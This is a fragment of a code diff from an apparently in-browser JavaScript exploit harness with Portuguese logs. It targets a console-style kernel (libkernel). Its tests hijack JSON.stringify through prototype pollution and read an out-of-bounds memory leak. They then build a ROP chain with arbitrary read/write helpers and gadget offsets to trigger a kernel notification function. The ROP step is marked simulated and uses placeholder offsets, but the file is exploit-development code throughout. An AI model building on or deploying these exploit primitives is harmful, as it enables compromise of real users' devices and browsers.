                  const FNAME = 'testPPJsonHijackInteraction'; log("--- Iniciando Teste: PP Hijack (JSON.stringify) + OOB Interaction ---", 'test', FNAME); const orig = JSON.stringify; let okH = false; let okL = false; let okR = false; try { JSON.stringify = function hijacked(v, r, s) { log("===> VULN: JSON.stringify SEQUESTRADO! <===", 'vuln', FNAME); okH = true; try { const l = leakedValueFromOOB; let lStr = "NULO ou Indefinido"; let lHex = ""; if (l != null) { lHex = ` (H=${toHex(l.high)}, L=${toHex(l.low)})`; lStr = l.type; okL = true; log(` ---> INFO: Interação Hijack + OOB Read Leak OK.`, 'escalation', FNAME); } log(` -> Valor OOB lido via Hijack: ${lStr}${lHex}`, okL ? 'leak' : 'warn', FNAME); } catch(ie) { log(` -> Erro ao tentar ler leak OOB via Hijack: ${ie.message}`, 'error', FNAME); console.error(ie); } const hijackReturnValue = '{"hijacked": true, "leak_read_success": ' + okL + '}'; return hijackReturnValue; }; await PAUSE(); const testObject = {a:1, b: 'test'}; const result = JSON.stringify(testObject); if (result && result.includes('"hijacked": true')) { log("VULN: Retorno da função JSON.stringify sequestrada verificado!", 'vuln', FNAME); okR = true; } else if (okH) { log("AVISO: JSON.stringify sequestrado, mas retorno inesperado.", 'warn', FNAME); } else { log("JSON.stringify não foi sequestrado.", 'good', FNAME); } } catch (e) { log(`Erro fatal durante Teste: ${e.message}`, 'error', FNAME); console.error(e); } finally { const currentStringify = JSON.stringify; JSON.stringify = orig; if (currentStringify !== orig && JSON.stringify !== orig) { log("ERRO CRÍTICO: FALHA ao restaurar JSON.stringify!", 'critical', FNAME); } else if (okH) { log("JSON.stringify restaurado.", 'good', 'Cleanup');} } log(`--- Teste Concluído (Hijack: ${okH}, Retorno: ${okR}, Leitura Leak: ${okL}) ---`, 'test', FNAME); return okR && okL;
             };
 
-            // Teste 7: Tentativa de Chamar Notificação Kernel via R/W Arbitrário (Simulado)
-            async function tryCallKernelNotifyViaRW() { // Renomeado para clareza
+
+            // Teste 7: Tentativa de Chamar Notificação Kernel via R/W Arbitrário (Opção B - Simulado)
+            async function tryCallKernelNotifyViaRW() {
                 const FNAME = 'tryCallKernelNotifyViaRW';
                 log(`--- Iniciando Teste: Chamada Notificação Kernel via R/W Arbitrário (Simulado) ---`, 'test', FNAME);
                 if (!arbitraryRWHelpers) { log("Helpers R/W Arbitrário não disponíveis. Pulando.", 'warn', FNAME); log(`--- Teste Concluído (Pulado) ---`, 'test', FNAME); return; }
                 const { read64, write64 } = arbitraryRWHelpers;
-                log(`R/W Arbitrário (Absoluto Simulado) disponível! Base Buffer: ${toHex(corruptedMetadataBufferBaseAddr)}`, 'info', FNAME);
+                log(`R/W Arbitrário (Absoluto Simulado) disponível! Base Buffer: ${toHex(corruptedMetadataBufferBaseAddr, 64)}`, 'info', FNAME);
                 const targetNotificationFuncAddress = BigInt(libkernelBaseAddress) + BigInt(notificationFuncOffset);
                 log(`Endereço alvo da Notificação: ${toHex(targetNotificationFuncAddress, 64)}`, 'info', FNAME);
                 const fakeStringAddress = corruptedMetadataBufferBaseAddr + 3000n;
                 const notificationMessage = "POC Exploit Funcionou! (Simulado)";
                 try {
-                    log(`(Simulado) Escrevendo string "${notificationMessage}" em ${toHex(fakeStringAddress)}...`, 'info', FNAME);
-                    // Simulação de escrita da string (precisaria de write8/writeBytes)
+                    log(`(Simulado) Escrevendo string "${notificationMessage}" em ${toHex(fakeStringAddress, 64)}...`, 'info', FNAME);
+                    // Simulação de escrita da string
                     log(`-> (Simulado) String escrita.`, 'info', FNAME);
                 } catch (e) { log(`Erro ao simular escrita da string: ${e.message}`, 'error', FNAME); log(`--- Teste Concluído (Erro ao preparar args) ---`, 'test', FNAME); return; }
                 const fakeStackBase = corruptedMetadataBufferBaseAddr + 4000n;
                 let ropStackPtr = fakeStackBase;
                 const ropChain = [];
-                log(`(Simulado) Construindo ROP chain em ${toHex(fakeStackBase)}...`, 'info', FNAME);
+                log(`(Simulado) Construindo ROP chain em ${toHex(fakeStackBase, 64)}...`, 'info', FNAME);
                 // --- Exemplo de ROP Chain (PLACEHOLDERS) ---
                 ropChain.push(BigInt(libkernelBaseAddress) + BigInt(ROP_POP_RDI_RET_OFFSET)); // pop rdi; ret
                 ropChain.push(fakeStringAddress);                                             // ptr para string
@@ -242,17 +245,18 @@
                          ropStackPtr += 8n;
                      }
                      log(`-> (Simulado) ROP chain escrita na memória.`, 'good', FNAME);
-                    log(`VULN: (SIMULADO) Trigger da ROP chain em ${toHex(fakeStackBase)}!`, 'vuln', FNAME);
+                    log(`VULN: (SIMULADO) Trigger da ROP chain em ${toHex(fakeStackBase, 64)}!`, 'vuln', FNAME);
                     log(`---> *** ALERTA: Tentativa de Execução de Código Kernel via R/W Arbitrário + ROP (Simulado)! ***`, 'escalation', FNAME);
                 } catch (e) { log(`Erro durante a construção/trigger ROP simulado: ${e.message}`, 'error', FNAME); }
                 log(`--- Teste Concluído (Simulação ROP via R/W Arb) ---`, 'test', FNAME);
                 await PAUSE();
             }
 
+
             // --- Função Principal de Execução Focada ---
             const runFocusedTests = async () => {
                 const FNAME = 'runFocusedTests';
-                const buttonToDisable = document.getElementById('runBtn'); // Obter referência ao botão
+                const buttonToDisable = document.getElementById('runBtn');
                 if (buttonToDisable) buttonToDisable.disabled = true;
                 // findings removido
                 ppGadgetsBroken = {}; // Resetar estado dos gadgets
@@ -262,7 +266,7 @@
                 arbitraryRWHelpers = null;
 
                 // summaryDiv removido
-                if (outputDiv) outputDiv.innerHTML = ''; // Limpar log anterior
+                if (outputDiv) outputDiv.innerHTML = '';
                 log("==== INICIANDO TESTES FOCADOS (Baseado nos Logs v18.1/v19.x) ====", 'test', FNAME);
 
                 // Ordem Lógica com ambas as opções
@@ -281,9 +285,6 @@
                 await tryCallKernelNotifyViaRW();     // 7. Tentar Opção B (R/W Arb ROP Simulado) - Pode ou não pular
 
                 // Sumário removido
-                // log("\n==== GERANDO SUMÁRIO FINAL (Focado) ====", 'test', FNAME);
-                // if (summaryDiv) { ... }
-
                 log("\n==== TESTES FOCADOS CONCLUÍDOS ====", 'test', FNAME);
                 if (buttonToDisable) buttonToDisable.disabled = false; // Reabilitar botão
             };
